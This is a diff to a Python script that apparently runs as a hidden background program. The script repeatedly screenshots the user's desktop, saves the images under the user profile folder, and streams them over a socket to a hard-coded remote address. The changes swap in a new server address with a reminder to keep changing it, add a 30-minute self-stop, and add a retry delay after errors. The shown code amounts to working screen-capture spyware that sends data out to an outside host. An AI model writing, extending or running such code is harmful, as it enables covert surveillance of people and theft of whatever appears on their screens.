@@ -4,6 +4,9 @@ import time
 import os
 import socket
 import struct
+import sys
+
+start_time = time.time()
 
 user_profile = os.environ['USERPROFILE']
 
@@ -52,12 +55,16 @@ os.makedirs(s_dir, exist_ok=True)
 
 count = 1
 
-server_address = ("192.168.56.1", 1235)
+# Always change the address.
+server_address = ("192.168.100.81", 4213)
 
 print(f"Connecting to {server_address}")
 
 with mss.mss() as screen_shot:
     while True:
+        if time.time() - start_time > 1800:
+            print("30 minutes reached. Stopping background executable completely.")
+            sys.exit()
         sock = None
         try:
             s_shot_name = f"{s_dir}/screenshot{str(count)}.png"
@@ -91,6 +98,7 @@ with mss.mss() as screen_shot:
             time.sleep(10)
         except Exception as e:
             print("Error:",e)
+            time.sleep(5)
 
 
 
